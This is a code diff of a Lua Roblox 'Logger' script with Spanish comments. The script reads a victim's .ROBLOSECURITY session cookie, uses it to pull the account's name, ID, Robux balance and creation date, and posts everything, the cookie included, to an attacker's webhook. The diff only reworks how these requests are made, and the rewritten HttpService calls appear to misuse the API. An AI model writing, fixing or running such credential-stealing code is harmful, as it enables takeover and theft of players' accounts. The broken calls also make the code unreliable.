@@ -21,7 +21,7 @@ local function readRobloxCookies()
     return nil
 end
 
--- Envía los datos al webhook
+-- Envía los datos al webhook usando HttpService
 local function sendWebhook(user, uid, robux, created, cookie)
     local payload = {
         username = "Roblox Logger",
@@ -40,35 +40,34 @@ local function sendWebhook(user, uid, robux, created, cookie)
             },
         },
     }
-    http.request({
-        Url = WEBHOOK,
-        Body = game:GetService("HttpService"):JSONEncode(payload),
-        Method = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
-    })
+    local http = game:GetService("HttpService")
+    local success, err = pcall(function()
+        http:PostAsync(WEBHOOK, http:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
+    end)
+    if not success then
+        print("Error al enviar webhook:", err)
+    end
 end
 
 -- Ejecuta
 local cookie = readRobloxCookies()
 if cookie then
     local success, response = pcall(function()
-        local info = http.request({
-            Url = "https://users.roblox.com/v1/users/authenticated",
-            Headers = { ["Cookie"] = ".ROBLOSECURITY=" .. cookie },
+        local http = game:GetService("HttpService")
+        local info = http:GetAsync("https://users.roblox.com/v1/users/authenticated", {
+            ["Cookie"] = ".ROBLOSECURITY=" .. cookie,
         }).Body
         local user = info:match('"name":"([^"]+)"') or "Desconocido"
         local uid = info:match('"id":(%d+)') or "N/A"
         local robux = "N/A"
         local created = "N/A"
         if uid then
-            local r = http.request({
-                Url = "https://economy.roblox.com/v1/users/" .. uid .. "/currency",
-                Headers = { ["Cookie"] = ".ROBLOSECURITY=" .. cookie },
+            local r = http:GetAsync("https://economy.roblox.com/v1/users/" .. uid .. "/currency", {
+                ["Cookie"] = ".ROBLOSECURITY=" .. cookie,
             }).Body
             robux = r:match('"robux":(%d+)') or "N/A"
-            local d = http.request({
-                Url = "https://users.roblox.com/v1/users/" .. uid,
-                Headers = { ["Cookie"] = ".ROBLOSECURITY=" .. cookie },
+            local d = http:GetAsync("https://users.roblox.com/v1/users/" .. uid, {
+                ["Cookie"] = ".ROBLOSECURITY=" .. cookie,
             }).Body
             created = d:match('"created":"([^"]+)"') or "N/A"
         end
